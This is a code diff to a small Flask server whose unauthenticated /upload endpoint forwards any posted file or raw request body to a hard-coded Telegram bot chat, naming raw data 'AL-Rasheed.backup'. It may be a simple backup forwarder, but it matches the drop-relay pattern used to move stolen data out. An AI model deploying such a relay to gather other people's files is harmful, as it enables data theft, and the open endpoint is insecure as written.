@@ -1,5 +1,6 @@
 from flask import Flask, request
 import requests
+import io
 
 app = Flask(__name__)
 
@@ -8,13 +9,20 @@ CHAT_ID = "6315170436"
 
 @app.route('/upload', methods=['POST'])
 def upload():
-    file = request.files['file']
-
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+    
+    if 'file' in request.files:
+        file_to_send = request.files['file']
+        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file_to_send})
+    else:
+        file_data = request.get_data()
+        if file_data:
+            file_to_send = io.BytesIO(file_data)
+            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": ("AL-Rasheed.backup", file_to_send)})
+        else:
+            return "No data received", 400
 
-    requests.post(url, data={"chat_id": CHAT_ID},
-                  files={"document": file})
+    return "OK", 200
 
-    return "OK"
-
-app.run(host="0.0.0.0", port=5000)
+if __name__ == '__main__':
+    app.run(host="0.0.0.0", port=5000)
